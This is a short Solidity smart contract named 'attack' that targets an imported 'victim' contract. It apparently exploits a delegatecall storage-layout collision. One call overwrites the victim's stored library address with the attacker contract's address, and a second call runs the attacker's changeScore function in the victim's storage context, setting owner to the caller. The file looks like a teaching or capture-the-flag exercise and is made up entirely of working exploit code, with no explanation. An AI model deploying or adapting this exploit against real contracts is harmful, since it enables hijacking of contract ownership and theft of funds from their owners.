pragma solidity ^0.6.0;
import "./victim.sol";

contract attack{
    address public lib;
    address public owner;
    uint256 public score;

    victim public victimContract;
    constructor(address _victimContract) public{
        victimContract = victim(_victimContract);
    }

    function attackContract() public{
        victimContract.changeScore(uint256(address(this)));
        victimContract.changeScore(1);
    }

    function changeScore(uint256 _score) external{
        owner = msg.sender;
    }
}